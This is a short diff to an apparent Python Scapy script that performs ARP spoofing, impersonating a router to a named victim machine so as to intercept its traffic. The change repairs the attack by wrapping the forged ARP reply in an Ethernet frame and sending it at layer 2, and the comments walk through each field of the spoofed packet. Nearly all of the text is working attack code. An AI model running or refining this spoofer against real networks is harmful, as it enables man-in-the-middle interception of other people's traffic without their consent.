@@ -23,12 +23,15 @@ def spoof(target_ip, spoof_ip, target_mac):
 
     # op=2 means "ARP Reply" (is-at)
     # pdst = "Who am I talking to?" (The Victim)
-    # hwdst = "Victim's MAC Address"
+    # hwdst = "Victim's MAC Address" (ARP layer)
     # psrc = "Who am I pretending to be?" (The Router/Gateway)
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    # Build proper packet with both Ethernet and ARP layers
+    ether = Ether(dst=target_mac)  # Ethernet destination MAC
+    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    packet = ether / arp
     
     # send the packet (verbose=False hides the output)
-    send(packet, verbose=False)
+    sendp(packet, verbose=False)  # Use sendp for layer 2 packets
 
 # USAGE EXAMPLE in a loop:
 # target_ip = "192.168.1.5" (Victim)
